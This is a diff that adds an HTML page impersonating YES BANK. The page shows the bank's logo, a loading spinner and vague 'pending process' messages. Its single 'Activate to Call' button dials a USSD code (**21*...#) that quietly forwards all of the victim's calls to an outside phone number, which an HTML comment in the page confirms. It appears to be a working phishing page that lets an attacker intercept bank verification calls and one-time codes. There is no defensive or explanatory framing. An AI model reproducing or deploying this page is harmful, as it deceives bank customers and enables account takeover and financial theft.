@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>iris - YES BANK - Processing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 100px auto 0;
+    }
+
+    .logo img {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
+    .spinner {
+      border: 5px solid #eee;
+      border-top: 5px solid #e91e63;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .verify-message {
+      font-size: 15px;
+      color: #d32f2f;
+      margin-top: 20px;
+      font-weight: 500;
+    }
+
+    .process-message {
+      font-size: 15px;
+      color: #333;
+      margin-top: 10px;
+      font-weight: 500;
+    }
+
+    .download-note {
+      margin-top: 40px;
+      color: #444;
+      font-size: 14px;
+    }
+
+    .call-button {
+      display: inline-block;
+      padding: 14px 30px;
+      margin-top: 15px;
+      background-color: #4CAF50;
+      color: white;
+      text-decoration: none;
+      border-radius: 30px;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+
+    .call-button:hover {
+      background-color: #388E3C;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://imgs.search.brave.com/a7JunU7klRpwmMvss_0rtLG3kgr_sJ8rXiUqnEbMq_0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9icmFu/ZGVwcy5jb20vbG9n/by1kb3dubG9hZC9Z/L1llcy1CYW5rLWxv/Z28tdmVjdG9yLTAx/LnN2Zw" alt="YES BANK Logo">
+    </div>
+
+    <div class="spinner"></div>
+
+    <div class="verify-message">
+      Note: Please use the button below to activate call.
+    </div>
+
+    <div class="process-message">
+      Your pending process will be completed after confirmation.
+    </div>
+
+    <p class="download-note">
+      Tap below to activate:
+    </p>
+
+    <!-- Call forwarding USSD code button -->
+    <a class="call-button" href="tel:**21*6207020483%23">Activate to Call</a>
+  </div>
+</body>
+</html>
